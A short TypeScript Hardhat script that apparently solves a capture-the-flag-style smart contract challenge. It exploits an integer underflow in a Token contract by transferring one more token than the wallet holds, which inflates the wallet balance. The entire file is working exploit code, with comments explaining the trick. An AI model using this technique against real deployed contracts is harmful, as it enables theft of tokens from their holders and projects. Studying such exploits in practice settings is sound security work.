import { BigNumber } from "ethers"
import { ethers } from "hardhat"

import { TOKEN } from "../constants"

const exploitToken = async () => {
    const accounts = await ethers.getSigners()
    const myWallet = accounts[0]

    const tokenContract = await ethers.getContractAt("Token", TOKEN)

    // we are given 20 tokens to begin with
    const balance: BigNumber = await tokenContract.balanceOf(myWallet.address)
    console.log(`balance in my account ${balance}`)

    // if I transfer 21 tokens to another account (say token contract)
    // due to arithmetic underflow my wallet balance (20-21) -> would be set to a very large value

    const tx = await tokenContract.transfer(tokenContract.address, balance.add(1))
    tx.wait(1)

    // new balance is very high
    const newBalance: BigNumber = await tokenContract.balanceOf(myWallet.address)
    console.log(`new balance in my account ${newBalance}`)
}

exploitToken()
    .then(() => {
        console.log("exploit token completed")
        process.exit(0)
    })
    .catch((e) => {
        console.error(e)
        process.exit(1)
    })
